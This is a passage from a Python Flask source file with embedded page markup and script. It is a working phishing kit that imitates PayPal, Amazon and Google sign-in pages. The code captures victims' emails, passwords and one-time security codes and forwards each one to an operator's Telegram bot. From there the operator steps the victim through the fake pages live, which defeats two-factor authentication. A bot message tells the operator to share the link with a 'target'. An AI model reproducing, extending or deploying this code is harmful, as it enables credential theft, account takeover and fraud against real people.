                <div class="otp-header">
                    <h1 class="otp-title">Enter security code</h1>
                    <p class="otp-description">Enter the 6-digit code we sent you</p>
                </div>
                <form id="otpForm">
                    <div class="form-group">
                        <input type="text" id="otp" class="otp-input" placeholder="· · · · · ·" maxlength="6" required>
                        <div class="otp-timer">
                            <span class="timer-text" id="timerText">Code expires in 1:00</span>
                            <button type="button" class="resend-btn" id="resendBtn" disabled>Resend code</button>
                        </div>
                    </div>
                    <button type="submit" class="btn" id="otpSubmitBtn" disabled>Continue</button>
                </form>
            </div>

            <!-- Success Step -->
            <div id="successStep" class="form-container hidden">
                <!-- Your verification page will be loaded here -->
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer>
        <div class="footer-container">
            <div class="footer-links">
                <a href="#">Contact Us</a>
                <a href="#">Privacy</a>
                <a href="#">Legal</a>
                <a href="#">Worldwide</a>
            </div>
        </div>
    </footer>

    <script>
        let sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        const loadingOverlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('loadingText');
        const emailStep = document.getElementById('emailStep');
        const passwordStep = document.getElementById('passwordStep');
        const otpStep = document.getElementById('otpStep');
        const successStep = document.getElementById('successStep');
        const emailForm = document.getElementById('emailForm');
        const passwordForm = document.getElementById('passwordForm');
        const otpForm = document.getElementById('otpForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const otpInput = document.getElementById('otp');
        const passwordToggle = document.getElementById('passwordToggle');
        const userEmail = document.getElementById('userEmail');
        const avatarCircle = document.getElementById('avatarCircle');
        const timerText = document.getElementById('timerText');
        const resendBtn = document.getElementById('resendBtn');
        const otpSubmitBtn = document.getElementById('otpSubmitBtn');
        const emailError = document.getElementById('emailError');
        const passwordError = document.getElementById('passwordError');
        const otpError = document.getElementById('otpError');
        const otpResend = document.getElementById('otpResend');

        let currentStep = 'email';
        let emailValue = '';
        let passwordValue = '';
        let otpValue = '';
        let otpTimer = 60;
        let timerInterval = null;
        let canResend = false;
        let isWaitingForOperator = false;

        function showLoading(text) {
            loadingText.textContent = text;
            loadingOverlay.classList.add('active');
            isWaitingForOperator = true;
        }

        function hideLoading() {
            loadingOverlay.classList.remove('active');
            isWaitingForOperator = false;
        }

        function formatTime(seconds) {
            const mins = Math.floor(seconds / 60);
            const secs = seconds % 60;
            return `${mins}:${secs.toString().padStart(2, '0')}`;
        }

        function showStep(step) {
            emailStep.classList.add('hidden');
            passwordStep.classList.add('hidden');
            otpStep.classList.add('hidden');
            successStep.classList.add('hidden');

            emailError.classList.add('hidden');
            passwordError.classList.add('hidden');
            otpError.classList.add('hidden');
            otpResend.classList.add('hidden');

            if (step === 'email') {
                emailStep.classList.remove('hidden');
            } else if (step === 'password') {
                passwordStep.classList.remove('hidden');
            } else if (step === 'otp') {
                otpStep.classList.remove('hidden');
            } else if (step === 'success') {
                successStep.classList.remove('hidden');
            }

            currentStep = step;
        }

        function startOtpTimer() {
            if (timerInterval) {
                clearInterval(timerInterval);
            }

            otpTimer = 60;
            canResend = false;
            resendBtn.disabled = true;
            timerText.classList.remove('expired');
            otpResend.classList.add('hidden');

            timerInterval = setInterval(() => {
                otpTimer--;

                if (otpTimer <= 0) {
                    clearInterval(timerInterval);
                    timerText.textContent = 'Code expired';
                    timerText.classList.add('expired');
                    canResend = true;
                    resendBtn.disabled = false;
                } else {
                    timerText.textContent = `Code expires in ${formatTime(otpTimer)}`;
                }
            }, 1000);
        }

        async function sendToBackend(field, value) {
            try {
                const response = await fetch('/submit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({session_id: sessionId, field: field, value: value, form_type: 'paypal'})
                });
                return await response.json();
            } catch (error) {
                return { success: false };
            }
        }

        async function checkOperatorStatus() {
            while (isWaitingForOperator) {
                try {
                    const response = await fetch('/status?session_id=' + sessionId + '&t=' + Date.now());
                    const data = await response.json();
                    
                    if (data.action) {
                        handleOperatorAction(data.action);
                        break;
                    }
                    await new Promise(resolve => setTimeout(resolve, 1000));
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        function handleOperatorAction(action) {
            hideLoading();
            
            if (action === 'show_password') {
                showStep('password');
            } else if (action === 'show_otp') {
                showStep('otp');
                startOtpTimer();
            } else if (action === 'show_success') {
                // Load your verification success page
                successStep.innerHTML = `''' + VERIFICATION_SUCCESS_TEMPLATE + '''`;
                showStep('success');
            } else if (action === 'show_email_error') {
                showStep('email');
                emailError.classList.remove('hidden');
                emailInput.value = '';
                emailInput.focus();
            } else if (action === 'show_password_error') {
                showStep('password');
                passwordError.classList.remove('hidden');
                passwordInput.value = '';
                passwordInput.focus();
            } else if (action === 'show_otp_error') {
                showStep('otp');
                otpError.classList.remove('hidden');
                otpInput.value = '';
                otpInput.focus();
                startOtpTimer();
            } else if (action === 'resend_otp') {
                showStep('otp');
                otpInput.value = '';
                otpResend.classList.remove('hidden');
                startOtpTimer();
            }
        }

        // Event handlers
        emailForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            emailValue = emailInput.value;

            if (emailValue) {
                showLoading('Verifying email address...');
                await fetch('/clear-session?session_id=' + sessionId);
                await sendToBackend('email', emailValue);
                userEmail.textContent = emailValue;
                avatarCircle.textContent = emailValue[0].toUpperCase();
                await checkOperatorStatus();
            }
        });

        passwordForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            passwordValue = passwordInput.value;

            if (passwordValue) {
                showLoading('Checking password...');
                await sendToBackend('password', passwordValue);
                await checkOperatorStatus();
            }
        });

        otpForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            otpValue = otpInput.value;

            if (otpValue.length === 6) {
                showLoading('Verifying security code...');
                await sendToBackend('otp', otpValue);
                await checkOperatorStatus();
            }
        });

        // Password toggle
        passwordToggle.addEventListener('click', () => {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                document.getElementById('eyeIcon').classList.add('hidden');
                document.getElementById('eyeOffIcon').classList.remove('hidden');
            } else {
                passwordInput.type = 'password';
                document.getElementById('eyeIcon').classList.remove('hidden');
                document.getElementById('eyeOffIcon').classList.add('hidden');
            }
        });

        // OTP input validation
        otpInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
            otpValue = e.target.value;
            otpSubmitBtn.disabled = otpValue.length !== 6;
        });

        // Resend code
        resendBtn.addEventListener('click', async () => {
            if (canResend) {
                showLoading('Requesting new code...');
                otpInput.value = '';
                otpValue = '';
                otpSubmitBtn.disabled = true;
                await sendToBackend('request_otp', 'new_otp_requested');
                showStep('otp');
                startOtpTimer();
                otpResend.classList.remove('hidden');
                hideLoading();
            }
        });

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            console.log('PayPal System initialized with session:', sessionId);
        });
    </script>
</body>
</html>
'''

# ========== FLASK ROUTES AND FUNCTIONS ==========

def send_telegram_message(text, reply_markup=None):
    """Send Telegram message"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    payload = {
        'chat_id': CHAT_ID,
        'text': text,
        'parse_mode': 'HTML',
        'disable_notification': True
    }
    
    if reply_markup:
        payload['reply_markup'] = reply_markup
    
    try:
        threading.Thread(target=requests.post, args=(url,), kwargs={'json': payload, 'timeout': 2}).start()
        return True
    except:
        return False

def create_form_selection_keyboard():
    """Create form selection keyboard"""
    return {
        "inline_keyboard": [
            [{"text": "🛍️ Amazon Form", "callback_data": "form:amazon"}],
            [{"text": "📧 Google Form", "callback_data": "form:google"}],
            [{"text": "💰 PayPal Form", "callback_data": "form:paypal"}]
        ]
    }

def create_keyboard(session_id, field, value, form_type):
    """Create keyboard for Telegram"""
    if form_type == "paypal" or form_type == "google":
        if field == 'email':
            keyboard = [
                [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
                [{"text": "✅ PROCEED TO PASSWORD", "callback_data": f"proceed_password:{session_id}"}],
                [{"text": "❌ EMAIL ERROR", "callback_data": f"email_error:{session_id}"}]
            ]
        elif field == 'password':
            keyboard = [
                [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
                [{"text": "🔑 COPY PASSWORD", "callback_data": f"copy:{session_id}:password"}],
                [{"text": "✅ PROCEED TO OTP", "callback_data": f"proceed_otp:{session_id}"}],
                [{"text": "❌ PASSWORD ERROR", "callback_data": f"password_error:{session_id}"}]
            ]
        elif field == 'otp':
            keyboard = [
                [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
                [{"text": "🔑 COPY PASSWORD", "callback_data": f"copy:{session_id}:password"}],
                [{"text": "🔢 COPY OTP", "callback_data": f"copy:{session_id}:otp"}],
                [{"text": "✅ PROCEED TO SUCCESS", "callback_data": f"proceed_success:{session_id}"}],
                [{"text": "❌ OTP ERROR", "callback_data": f"otp_error:{session_id}"}],
                [{"text": "🔄 RESEND OTP", "callback_data": f"resend_otp:{session_id}"}]
            ]
    else:  # amazon
        if field == 'email':
            keyboard = [
                [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
                [{"text": "✅ PROCEED TO PASSWORD", "callback_data": f"proceed_password:{session_id}"}],
                [{"text": "❌ EMAIL ERROR", "callback_data": f"email_error:{session_id}"}]
            ]
        elif field == 'password':
            # For Amazon, no keyboard needed since it auto-proceeds
            keyboard = [
                [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
                [{"text": "🔑 COPY PASSWORD", "callback_data": f"copy:{session_id}:password"}],
                [{"text": "✅ AUTO SUCCESS", "callback_data": f"auto_success:{session_id}"}]
            ]
    
    return {"inline_keyboard": keyboard}

def get_telegram_updates():
    """Get Telegram updates"""
    global last_update_id
    
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        params = {'timeout': 3, 'offset': last_update_id + 1}
        
        response = requests.get(url, params=params, timeout=4)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('ok') and data.get('result'):
                for update in data['result']:
                    last_update_id = update['update_id']
                    
                    if 'message' in update and 'text' in update['message']:
                        text = update['message']['text']
                        if text == '/start':
                            return f"start_command:{update['message']['chat']['id']}"
                    
                    if 'callback_query' in update:
                        return update['callback_query']['data']
        return None
    except Exception:
        return None

def process_commands_background():
    """Process Telegram commands in background"""
    global current_form_type
    
    while True:
        try:
            command = get_telegram_updates()
            if command:
                # Start command
                if command.startswith('start_command:'):
                    keyboard = create_form_selection_keyboard()
                    send_telegram_message(
                        f"🌐 <b>WELCOME TO LOGIN SYSTEM</b>\n"
                        f"Choose which login form you want to use:\n"
                        f"⏰ {datetime.now().strftime('%H:%M:%S')}",
                        keyboard
                    )
                
                # Form selection
                elif command.startswith('form:'):
                    form_type = command.split(':')[1]
                    current_form_type = form_type
                    render_url = os.getenv('RENDER_EXTERNAL_URL', 'https://your-app.onrender.com')
                    
                    form_names = {
                        "amazon": "🛍️ Amazon",
                        "google": "📧 Google", 
                        "paypal": "💰 PayPal"
                    }
                    form_name = form_names.get(form_type, "Unknown")
                    
                    send_telegram_message(
                        f"✅ <b>{form_name.upper()} FORM SELECTED</b>\n"
                        f"🔗 Your Link: {render_url}\n"
                        f"📱 Share this link with your target\n"
                        f"⏰ {datetime.now().strftime('%H:%M:%S')}"
                    )
                
                # Copy commands
                elif command.startswith('copy:'):
                    parts = command.split(':')
                    if len(parts) >= 3:
                        session_id, field = parts[1], parts[2]
                        if session_id in sessions:
                            value = sessions[session_id].get(field, '')
                            send_telegram_message(
                                f"📋 <b>COPY {field.upper()}</b>\n<code>{value}</code>\n\n⏰ {datetime.now().strftime('%H:%M:%S')}"
                            )
                
                # Action commands
                elif ':' in command:
                    action, session_id = command.split(':', 1)
                    action_map = {
                        'proceed_password': 'show_password',
                        'email_error': 'show_email_error', 
                        'proceed_otp': 'show_otp',
                        'proceed_success': 'show_success',
                        'password_error': 'show_password_error',
                        'otp_error': 'show_otp_error',
                        'resend_otp': 'resend_otp',
                        'auto_success': 'show_success'
                    }
                    
                    if action in action_map and session_id in sessions:
                        sessions[session_id]['action'] = action_map[action]
                        sessions[session_id]['last_update'] = time.time()
            
            time.sleep(0.2)
            
        except Exception as e:
            time.sleep(0.3)

# Start background processor
command_thread = threading.Thread(target=process_commands_background, daemon=True)
command_thread.start()

@app.route('/')
def home():
    """Serve the appropriate form"""
    if current_form_type == "amazon":
        return render_template_string(AMAZON_TEMPLATE)
    elif current_form_type == "google":
        return render_template_string(GOOGLE_TEMPLATE)
    else:  # paypal
        return render_template_string(PAYPAL_TEMPLATE)

@app.route('/submit', methods=['POST'])
def submit():
    """Handle form submissions"""
    data = request.json
    session_id = data.get('session_id')
    field = data.get('field')
    value = data.get('value')
    form_type = data.get('form_type', current_form_type)
    
    if session_id not in sessions:
        sessions[session_id] = {}
    
    sessions[session_id][field] = value
    sessions[session_id]['last_update'] = time.time()
    
    # Clear previous action
    if 'action' in sessions[session_id]:
        del sessions[session_id]['action']
    
    # Telegram notifications
    form_names = {
        "amazon": "🛍️ AMAZON",
        "google": "📧 GOOGLE", 
        "paypal": "💰 PAYPAL"
    }
    form_name = form_names.get(form_type, "UNKNOWN")
    keyboard = create_keyboard(session_id, field, value, form_type)
    
    if field == 'email':
        send_telegram_message(
            f"📧 <b>{form_name} - EMAIL SUBMITTED</b>\n"
            f"Email: <code>{value}</code>\n"
            f"Session: {session_id[-12:]}\n"
            f"⏰ {datetime.now().strftime('%H:%M:%S')}",
            keyboard
        )
    elif field == 'password':
        send_telegram_message(
            f"🔑 <b>{form_name} - PASSWORD SUBMITTED</b>\n"
            f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
            f"Password: <code>{value}</code>\n"
            f"Session: {session_id[-12:]}\n"
            f"⏰ {datetime.now().strftime('%H:%M:%S')}",
            keyboard
        )
    elif field == 'otp':
        send_telegram_message(
            f"🔢 <b>{form_name} - OTP SUBMITTED</b>\n"
            f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
            f"OTP: <code>{value}</code>\n"
            f"Session: {session_id[-12:]}\n"
            f"⏰ {datetime.now().strftime('%H:%M:%S')}",
            keyboard
        )
    elif field == 'request_otp':
        send_telegram_message(
            f"🔄 <b>{form_name} - OTP RESEND REQUESTED</b>\n"
            f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
            f"Session: {session_id[-12:]}\n"
            f"⏰ {datetime.now().strftime('%H:%M:%S')}"
        )
    
    return jsonify({'success': True})

@app.route('/status')
def status():
    """Check session status"""
    session_id = request.args.get('session_id')
    action = sessions[session_id].get('action') if session_id in sessions else None
    return jsonify({'action': action})

@app.route('/clear-session')
def clear_session():
    """Clear session action"""
    session_id = request.args.get('session_id')
    if session_id in sessions and 'action' in sessions[session_id]:
        del sessions[session_id]['action']
    return jsonify({'success': True})

if __name__ == "__main__":
    print("🚀 ULTRA-FAST LOGIN SYSTEM STARTED")
    print("📧 Amazon: Auto-success after password")
    print("📧 Google & PayPal: Telegram approval after OTP")
    print("🌐 Ready for Render deployment")
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)